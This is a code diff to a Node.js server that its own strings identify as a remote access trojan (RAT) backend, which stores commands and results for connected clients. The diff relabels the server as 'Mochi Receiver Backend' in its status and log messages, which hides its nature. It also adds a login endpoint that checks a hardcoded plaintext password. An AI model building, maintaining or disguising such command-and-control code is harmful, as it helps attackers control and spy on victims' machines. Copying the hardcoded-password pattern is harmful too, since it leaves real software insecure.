@@ -7,6 +7,7 @@ const path = require('path');
 
 const app = express();
 const PORT = process.env.PORT || 3000;
+const LOGIN_PASSWORD = 'pedocatch2026com';
 
 app.use(cors());
 app.use(express.json({ limit: '50mb' }));
@@ -31,6 +32,16 @@ db.run(`CREATE TABLE IF NOT EXISTS commands (
   result TEXT,
   timestamp INTEGER
 )`);
+
+// ===== LOGIN ENDPOINT =====
+app.post('/api/login', (req, res) => {
+  const { password } = req.body;
+  if (password === LOGIN_PASSWORD) {
+    res.json({ success: true, message: 'Login successful' });
+  } else {
+    res.status(401).json({ success: false, message: 'Invalid password' });
+  }
+});
 
 const server = http.createServer(app);
 const wss = new WebSocket.Server({ server });
@@ -183,13 +194,13 @@ app.get('/api/commands/:clientId/:type', (req, res) => {
 
 app.get('/', (req, res) => {
   res.json({
-    status: 'RAT Backend running',
+    status: 'Mochi Receiver Backend',
     clients: activeClients.size,
     uptime: process.uptime()
   });
 });
 
 server.listen(PORT, '0.0.0.0', () => {
-  console.log(`[+] Servidor RAT backend corriendo en puerto ${PORT}`);
+  console.log(`[+] Servidor Mochi Receiver corriendo en puerto ${PORT}`);
   console.log(`[+] Clientes activos: 0`);
 });
